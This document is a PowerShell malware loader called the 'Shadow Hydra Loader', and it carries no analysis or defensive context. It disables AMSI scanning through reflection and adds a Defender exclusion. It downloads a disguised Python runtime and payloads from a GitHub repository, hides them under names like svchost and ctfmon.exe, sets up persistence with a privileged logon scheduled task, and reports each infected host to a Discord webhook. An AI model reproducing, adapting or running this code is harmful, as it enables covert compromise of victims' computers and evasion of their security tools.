# --- THE SHADOW HYDRA LOADER (V9.3 - RE-VERIFIED) ---
# 0. BLIND THE WATCHDOG
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,$null)}}}}

$WEBHOOK = "https://discord.com/api/webhooks/1505044718797586577/-gbKCGDVp0tz3RjJl3IfaTTU1xuu3ZBP4fmrL-jq_s0NbA_1iB8zFM0BURGTRTQcZg8U"
function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json"; Start-Sleep -s 1 } catch {} }

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"
$TASK_NAME = "MsCtfMonitorSystem"

if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }) { exit }
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }

# 1. ATTEMPT DEFENDER EXCLUSION (Verified SID check)
$currentId = [System.Security.Principal.WindowsIdentity]::GetCurrent()
if ($currentId.Groups -contains "S-1-5-32-544") {
    Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
}

# 2. LANDING CORE & PAYLOADS
if (!(Test-Path $PY_MASK)) {
    Send-Ghost "Landing Private Engine..."
    $zip = "$Path\py.zip"
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/py_core.zip" -OutFile $zip
    if (!(Test-Path "$Path\python")) { New-Item -ItemType Directory -Path "$Path\python" -Force }
    
    # Using Expand-Archive for better reliability
    Expand-Archive -Path $zip -DestinationPath "$Path\python" -Force
    Remove-Item $zip -ErrorAction SilentlyContinue
}

Send-Ghost "Syncing Shadow Logic..."
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py" -OutFile "$Path\WinServices.py"
$binZip = "$Path\mui_cache.zip"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin" -OutFile $binZip

# Unzip payloads
Expand-Archive -Path $binZip -DestinationPath $Path -Force
Remove-Item $binZip -ErrorAction SilentlyContinue

# 3. PERSISTENCE VIA SCHEDULED TASK
$action = New-ScheduledTaskAction -Execute $PY_MASK -Argument "`"$Path\WinServices.py`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
# Simple registration that doesn't need complex setting objects
Register-ScheduledTask -TaskName $TASK_NAME -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction SilentlyContinue

# 4. ENGAGE
Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden
Send-Ghost "Hydra v9.3 Online. Re-verified and active."
